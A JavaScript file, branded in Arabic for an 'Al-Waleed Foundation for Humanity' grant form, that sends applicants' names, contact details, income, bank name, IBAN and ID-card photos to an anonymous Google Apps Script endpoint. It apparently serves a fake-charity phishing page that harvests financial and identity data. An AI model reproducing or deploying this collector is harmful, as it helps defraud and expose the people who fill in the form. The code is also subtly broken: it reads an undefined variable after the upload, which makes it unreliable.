Enter/* ================================================
   Google Sheets Integration
   مؤسسة الوليد للإنسانية
   ================================================
   الملف: js/sheets.js
   ------------------------------------------------
   ✅ ضع رابط Apps Script الخاص بك في السطر التالي
   ------------------------------------------------ */

var APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby-fvc-LsoVHWwNdpP1Rvk4jJO-IFP5FBu9u9_6lxVd1fs0UKJPAq4P5dF1EZUfmVAO1Q/exec';

/* ================================================
   الدالة الرئيسية: حفظ الطلب في Google Sheets
   ================================================ */
async function saveToGoogleSheets(txNumber) {
    try {

        // ① تجهيز البيانات
        var payload = {
            transaction_id:    txNumber,
            full_name:         formData.personalInfo.fullName          || '',
            country:           formData.personalInfo.country           || '',
            marital_status:    formData.personalInfo.maritalStatus     || '',
            num_children:      formData.personalInfo.numChildren       || 0,
            phone:             formData.contactCareer.phone            || '',
            email:             formData.contactCareer.email            || '',
            profession:        formData.contactCareer.profession       || '',
            monthly_income:    formData.contactCareer.income           || 0,
            grant_type:        formData.grantDetails.grantType         || '',
            grant_amount:      formData.grantDetails.grantAmount       || 0,
            grant_description: formData.grantDetails.grantDescription  || '',
            bank_name:         formData.bankingInfo.bankName           || '',
            account_holder:    formData.bankingInfo.accountHolder      || '',
            iban:              (formData.bankingInfo.iban || '').replace(/\s/g, '')
        };

        console.log('📤 جاري الحفظ في Google Sheets...');

        // ② إرسال البيانات النصية
        var response = await fetch(APPS_SCRIPT_URL, {
    method:  'POST',
    body:    JSON.stringify(payload),
    mode:    'no-cors'
});

        // no-cors لا يسمح بقراءة الرد، لكن البيانات تصل
console.log('✅ تم الإرسال إلى Google Sheets');

        console.log('✅ تم حفظ البيانات في Google Sheets!');

        // ③ رفع الصور إلى Google Drive (إن وُجدت)
        var rowId = result.rowId || txNumber;
        await uploadImagesToDrive(rowId, txNumber);

        return true;

    } catch (err) {
        console.error('❌ خطأ في الاتصال:', err.message);
        // نكمل ولا نوقف العملية - الواتساب سيُرسل على أي حال
        return false;
    }
}

/* ================================================
   رفع الصور إلى Google Drive عبر Apps Script
   ================================================ */
async function uploadImagesToDrive(rowId, txNumber) {
    var photos = [
        { key: 'idCardFront', label: 'front' },
        { key: 'idCardBack',  label: 'back'  }
    ];

    for (var i = 0; i < photos.length; i++) {
        var photo = photos[i];
        var file  = formData.attachments[photo.key];
        if (!file) continue;

        try {
            // تحويل الصورة إلى Base64
            var base64 = await fileToBase64(file);

            var uploadPayload = {
                action:      'uploadImage',
                rowId:       rowId,
                txNumber:    txNumber,
                imageLabel:  photo.label,
                fileName:    file.name,
                mimeType:    file.type,
                base64Data:  base64
            };

            await fetch(APPS_SCRIPT_URL, {
    method: 'POST',
    body:   JSON.stringify(uploadPayload),
    mode:   'no-cors'
});
console.log('✅ تم إرسال صورة ' + photo.label);

        } catch (uploadErr) {
            console.warn('⚠️ فشل رفع صورة ' + photo.label + ':', uploadErr.message);
        }
    }
}

/* ================================================
   تحويل الملف إلى Base64
   ================================================ */
function fileToBase64(file) {
    return new Promise(function(resolve, reject) {
        var reader = new FileReader();
        reader.onload  = function() {
            // إزالة رأس البيانات data:image/jpeg;base64,
            var base64 = reader.result.split(',')[1];
            resolve(base64);
        };
        reader.onerror = function() { reject(new Error('فشل قراءة الملف')); };
        reader.readAsDataURL(file);
    });
}
